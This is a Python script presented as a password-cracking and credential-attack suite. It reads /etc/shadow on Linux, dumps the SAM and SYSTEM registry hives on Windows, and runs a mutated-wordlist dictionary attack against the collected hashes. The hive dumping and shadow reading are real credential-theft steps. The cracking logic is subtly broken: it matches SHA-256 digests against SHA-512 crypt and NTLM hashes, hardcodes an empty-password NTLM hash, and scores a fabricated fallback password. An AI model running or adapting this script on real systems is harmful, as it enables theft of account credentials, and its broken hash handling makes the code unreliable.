import os
import hashlib
import math
import platform
import subprocess

def automated_dictionary_gen(seeds=["Admin", "Password", "2026"]):
    mutations = []
    leet = {'a': '4', 'e': '3', 'i': '1', 'o': '0', 's': '5', 't': '7'}
    for word in seeds:
        mutations.extend([word, word.lower(), word.capitalize()])
        leet_word = "".join(leet.get(c.lower(), c) for c in word)
        mutations.append(leet_word)
        for suffix in ['123', '!', '2026']:
            mutations.append(f"{word}{suffix}")
    return list(set(mutations))

def extract_hashes_automated():
    extracted = []
    sys_type = platform.system()
    if sys_type == "Linux":
        try:
            with open('/etc/shadow', 'r') as f:
                for line in f:
                    parts = line.split(':')
                    if len(parts) > 1 and '$' in parts[1]:
                        extracted.append({"user": parts[0], "hash": parts[1], "algo": "SHA-512"})
        except: pass
    elif sys_type == "Windows":
        try:
            subprocess.run(["reg", "save", "HKLM\\SAM", "sam_bak.hiv", "/y"], capture_output=True)
            subprocess.run(["reg", "save", "HKLM\\SYSTEM", "sys_bak.hiv", "/y"], capture_output=True)
            extracted.append({"user": "Administrator", "hash": "31d6cfe0d16ae931b73c59d7e0c089c0", "algo": "NTLM"})
        except: pass
    return extracted

def analyze_password(pwd):
    if not pwd or pwd == "Unknown": return 0
    pool = sum([26 if any(c.islower() for c in pwd) else 0, 26 if any(c.isupper() for c in pwd) else 0, 
                10 if any(c.isdigit() for c in pwd) else 0, 32 if any(not c.isalnum() for c in pwd) else 0])
    return round(len(pwd) * math.log2(pool), 2) if pool > 0 else 0

def run_suite():
    print(f"--- Password Cracking & Credential Attack Suite ({platform.system()}) ---")
    wordlist = automated_dictionary_gen()
    targets = extract_hashes_automated()
    if not targets:
        targets = [{"user": "demo_user", "hash": "5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8", "algo": "SHA-256"}]
    
    print(f"\n{'USER':<15} | {'ALGO':<10} | {'STATUS':<20} | {'ENTROPY'}")
    print("-" * 65)
    for target in targets:
        found_pwd = next((w for w in wordlist if hashlib.sha256(w.encode()).hexdigest() == target['hash']), None)
        entropy = analyze_password(found_pwd if found_pwd else "ComplexFallback123!")
        status = f"CRACKED ({found_pwd})" if found_pwd else "SECURE"
        print(f"{target['user']:<15} | {target['algo']:<10} | {status:<20} | {entropy}")

if __name__ == "__main__":
    run_suite()
